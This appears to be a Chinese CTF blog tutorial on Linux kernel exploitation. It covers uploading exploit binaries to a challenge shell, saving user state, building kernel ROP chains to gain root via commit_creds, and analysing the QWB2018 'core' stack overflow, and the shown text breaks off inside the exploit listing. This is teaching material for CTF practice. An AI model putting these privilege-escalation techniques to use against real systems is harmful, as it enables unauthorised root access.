

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="宁也是带黑阔？">
<meta property="og:type" content="article">
<meta property="og:title" content="【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF">
<meta property="og:url" content="http://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="宁也是带黑阔？">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/03/03/JXPaRGtvIKU3rzk.png">
<meta property="article:published_time" content="2021-03-03T07:36:24.000Z">
<meta property="article:modified_time" content="2023-08-14T03:48:31.122Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Linux Kernel">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="Use After Free">
<meta property="article:tag" content="Kernel UAF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/03/03/JXPaRGtvIKU3rzk.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/03/03/qC9eGRgHU3axBJW.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-03-03 18:36" pubdate>
          2021年3月3日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          148k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1236 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2023年8月14日 下午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>宁也是带黑阔？</p>
<span id="more"></span>

<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>毫无疑问，对于内核漏洞进行利用，并最终提权到 root，在黑客界是一种最为 old school 的美学 ：)</p>
<p>而CTF中的 kernel pwn 类型的题目则恰好是入门 kernel exploit 最好的方式之一，因此本篇博客由浅入深简单讲讲 CTF 中几种较为常见的 kernel 利用方式，同时为了让大家了解更多的利用手法，<strong>笔者每道题都会尽量采用不同的结构体进行利用 ：)</strong></p>
<p>关于内核常见的几种保护机制，参见<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#0x08-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6">这里</a></p>
<p> <strong>✳ kernel pwn与用户态的pwn在本质上并无差别</strong></p>
<blockquote>
<p>需要注意的是，CTF中的kernel pwn通常不会让选手去真正寻找内核中的漏洞，而通常是给出一个有漏洞的LKM让选手进行分析</p>
<blockquote>
<p>但如果你有一个 kernel 0day 你便可以通杀大部分比赛的 kernel pwn 题  ：)</p>
</blockquote>
</blockquote>
<blockquote>
<p>本篇博客虽然最初写于 2021 年，但偶尔也会根据内核的一些发展变迁进行小部分变动：）</p>
</blockquote>
<h2 id="文件远程传输方式"><a href="#文件远程传输方式" class="headerlink" title="文件远程传输方式"></a>文件远程传输方式</h2><p>通常情况下，在CTF中一个用作 exploit 的静态编译的可执行文件的体积通常可以达到数百KB甚至几M往上，我们没法很方便地将其直接上传到服务器</p>
<p>目前来说比较通用的办法便是将 exploit 进行 base64 编码后传输，可参考笔者所给出的如下脚本：</p>
<blockquote>
<p>笔者优化后的打远程用的脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">11451</span>)<br><span class="hljs-comment">#p = process(&#x27;./run.sh&#x27;)</span><br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>    <br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<blockquote>
<p>笔者早期写的打远程用的脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time, os<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;./boot.sh&#x27;</span>)<span class="hljs-comment">#remote(&quot;127.0.0.1&quot;, 5555)</span><br><br>os.system(<span class="hljs-string">&quot;tar -czvf exp.tar.gz ./exploit&quot;</span>)<br>os.system(<span class="hljs-string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./b64_exp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br><br>p.sendline()<br>p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)<br><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;now line: &#x27;</span> + <span class="hljs-built_in">str</span>(count))<br>    line = f.readline().replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)&lt;=<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    cmd = <span class="hljs-string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="hljs-string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span><br>    p.sendline(cmd) <span class="hljs-comment"># send lines</span><br>    <span class="hljs-comment">#time.sleep(0.02)</span><br>    <span class="hljs-comment">#p.recv()</span><br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>    count += <span class="hljs-number">1</span><br>f.close()<br><br>p.sendline(<span class="hljs-string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;tar -xzvf exp.tar.gz&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;chmod +x ./exploit;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;./exploit&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>相比起常规的 pwn 题，kernel pwn 打远程会是一个比较漫长的过程，因为大部分的时间都会花在这个文件传输上</p>
<p>对于部分不需要一些额外功能（如userfaultfd）的题目可以使用 musl-C 库来大幅降低可执行文件的大小</p>
<p>对于时间比较充足的题目笔者推荐使用纯汇编来编写exp（笑）</p>
<blockquote>
<p>若是运气不大好或者网速太慢，那么你可能会需要从头来过…</p>
<p><img src="https://i.loli.net/2021/07/21/VI1wAplsh2W5UYg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<h2 id="笔者自用模板"><a href="#笔者自用模板" class="headerlink" title="笔者自用模板"></a><em>笔者自用模板</em></h2><p>笔者将 kernel pwn 中常用的一些数据、函数等等封装在一个头文件 <code>kernelpwn.h</code> 中，封装好了一些如 userfaultfd、keyctl、msg_msg 等的常用物</p>
<blockquote>
<p>笔者按函数命名法分成了两种（因为笔者以前喜欢小驼峰现在喜欢下划线😀）：</p>
<ul>
<li><p>下划线版本： <a href="/download/pwn_tools/kernelpwn.h" title="点击此处进行下载">kernelpwn.h</a></p>
</li>
<li><p>小驼峰版本（不再更新）： <a href="/download/kernelpwn.h" title="点击此处进行下载">kernelpwn.h</a></p>
</li>
</ul>
</blockquote>
<p><del>这里需要注意的是 musl 库缺少很多的东西，所以该模板仅适用于 glibc，如果要用 musl 编译的话需要大家自行修改：(</del></p>
<p>现在下划线版本自用模板已经支持使用 musl 编译：）</p>
<h1 id="0x01-Kernel-ROP-basic"><a href="#0x01-Kernel-ROP-basic" class="headerlink" title="0x01.Kernel ROP - basic"></a>0x01.Kernel ROP - basic</h1><p>ROP即<code>返回导向编程</code>（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流</p>
<p>✳ <strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong><code>system(&quot;/bin/sh&quot;)</code><strong>变为了</strong> <code>commit_creds(prepare_kernel_cred(&amp;init_task)) 或 commit_creds(&amp;init_cred)</code></p>
<p>当成功执行如上函数之后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell</p>
<ul>
<li>需要注意的是 <strong>旧版本内核上所用的提权方法 <code>commit_creds(prepare_kernel_cred(NULL))</code> 已经不再能被使用，在高版本的内核当中 <code>prepare_kernel_cred(NULL)</code> 将不再返回一个 root cred</strong>，这也令 ROP chain 的构造变为更加困难 ：(</li>
</ul>
<h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>通常情况下，我们的exploit需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个root权限的shell，因此在我们的exploit进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态</p>
<p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p>
<blockquote>
<p>算是一个通用的pwn板子</p>
<p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>在<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#IV-%E5%86%85%E6%A0%B8%E6%80%81-%E2%80%94-gt-%E7%94%A8%E6%88%B7%E6%80%81"> 这篇博客 </a>当中笔者简要叙述了内核态返回用户态的过程：</p>
<ul>
<li><code>swapgs</code>指令恢复用户态GS寄存器</li>
<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
</ul>
<p>那么我们只需要在内核中找到相应的gadget并执行<code>swapgs;iretq</code>就可以成功着陆回用户态</p>
<p>通常来说，我们应当构造如下rop链以返回用户态并获得一个shell：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">↓   swapgs<br>    iretq<br>    user_shell_addr<br>    user_cs<br>    user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure>

<blockquote>
<p>内核ROP和用户态的ROP本质上没有太大区别，细节便不在此赘叙了</p>
<blockquote>
<p><del>什么？你说你⑧会 ROP ？那你看个🔨kernel pwn</del></p>
<p>👴悟🌶！**带学的带手子pwner在VNCTF2021告诉👴 ROP 事一个寄存器！</p>
</blockquote>
</blockquote>
<h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><blockquote>
<p>依然是十分经典的kernel pwn入门题</p>
<p><a href="/download/qwb2018/pwn/core.7z" title="点此下载原题附件">点击下载-core.7z</a></p>
</blockquote>
<p>首先查看启动脚本<code>start.sh</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>-s  \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<ul>
<li>开启了KASLR保护</li>
</ul>
<p>解压文件系统，查看<code>init</code>文件：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>

<ul>
<li>开始时内核符号表被复制了一份到<code>/tmp/kalsyms</code>中，利用这个我们可以获得内核中所有函数的地址</li>
<li>不出意外的话<code>core.ko</code>就是存在漏洞的内核模块</li>
<li>改变权限前设置了定时关机，调试的时候可以把这个语句先删掉</li>
</ul>
<h3 id="①-分析"><a href="#①-分析" class="headerlink" title="① 分析"></a>① 分析</h3><p>惯例的<code>checksec</code>一下，开了NX和canary</p>
<p><img src="https://i.loli.net/2021/03/04/Nrpe675FRtBP4ju.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>拖入IDA进行分析，符号表没抠，很开心（</p>
<p>初始化函数中创建了一个进程节点文件<code>/proc/core</code>，这也是我们后续与内核模块间通信的媒介</p>
<p><img src="https://i.loli.net/2021/03/04/zocOw75hPrBIZkH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>简单分析自定义的fop结构体<code>core_fops</code>，发现只自定义了三个回调函数</p>
<p><img src="https://i.loli.net/2021/03/04/JHyemlLTK5G34E2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/04/TvhVpN86dmfzHoW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/04/lDBmUK5fia3bnHL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>其中<code>core_release</code>仅为打印功能，就不在此放出了</p>
<p>而<code>core_write</code>的功能主要是允许用户向bss段上写入最多<code>0x800</code>字节的内容</p>
<p><img src="https://i.loli.net/2021/03/08/bHKGQyTV7xMB5jS.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在<code>core_ioctl</code>中允许我们调用<code>core_read</code>和<code>core_copy_func</code>这两个函数，以及设置全局变量<code>off</code>的值</p>
<p><img src="https://i.loli.net/2021/03/08/faCDRKvMSN64eux.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在<code>core_read</code>函数中允许我们从栈上读取数据，由于<code>off</code>变量的值可以由我们控制，故我们可以利用该函数泄露栈上数据，包括<code>canary</code></p>
<p><img src="https://i.loli.net/2021/03/08/5ITzXBM3gJ2YEch.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="②-漏洞利用：Kernel-ROP"><a href="#②-漏洞利用：Kernel-ROP" class="headerlink" title="② 漏洞利用：Kernel ROP"></a>② 漏洞利用：Kernel ROP</h3><p>在<code>core_copy_func</code>中将会拷贝bss段上内容到栈上，由于其拷贝时使用低16字节作为判断长度，若是我们传入一个恰当的负数，便能拷贝最多0xffff字节的数据到栈上</p>
<p>故<strong>存在栈溢出，且溢出数据可控</strong></p>
<p><img src="https://i.loli.net/2021/03/08/2RYiWgwhFbpq7VC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么我们便能够利用栈溢出在栈上构造ROP chain以提权</p>
<p>而canary的值可以通过ioctl提供的功能以泄露，此前内核符号表又已经被拷贝到了<code>/tmp/kallsyms</code>下，我们便可以从中读取各个内核符号的地址</p>
<p>只要我们能够在内核空间执行<code>commit_cred(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code></p>
<p>至于gadget可以直接使用ROPgadget或者ropper对着vmlinux镜像跑一轮，这里便不再赘叙</p>
<blockquote>
<p>不明原因，笔者的ROPgadget没法找到<code>iretq</code>，只好使用 pwntools 来搜</p>
<p><img src="https://s2.loli.net/2022/05/18/cSokGuy3fHxOKhm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<p>调试的时候我们可以先把kaslr关掉，获取没有偏移的函数地址，后续再通过该值计算偏移</p>
<p><img src="https://i.loli.net/2021/03/09/qcQBySIFpu9X1Hl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="③-exploit"><a href="#③-exploit" class="headerlink" title="③ exploit"></a>③ exploit</h3><p>我们这里选择执行<code>commit_creds(prepare_kernel_cred(NULL))</code>以提权</p>
<p>由于是内核态的rop，故我们需要手动返回用户态执行<code>/bin/sh</code>，这里我们需要模拟由用户态进入内核态再返回用户态的过程</p>
<p>构造exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 